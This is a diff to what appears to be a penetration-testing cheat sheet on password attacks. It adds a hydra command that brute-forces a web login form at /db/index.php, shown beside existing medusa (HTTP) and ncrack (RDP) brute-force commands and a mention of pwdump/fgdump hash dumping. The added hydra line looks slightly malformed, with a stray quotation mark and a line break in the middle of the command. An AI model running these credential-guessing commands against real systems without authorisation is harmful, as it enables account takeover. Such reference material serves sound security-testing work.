@@ -67,6 +67,8 @@ pwdump and fgdump inject a DLL containning the hash dumping code into the ***Loc
 
 #### HTTP
 - medusa -h [url] -u [user_name] -p [password_file.txt] -M http
+- hydra [target_url] -l [user_name] -P [password_file] https-post-form 
+/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
 
 #### RDP B
 - ncrack -vv --user [user_name] -P [password_file.txt] rdp://[victim_ip]
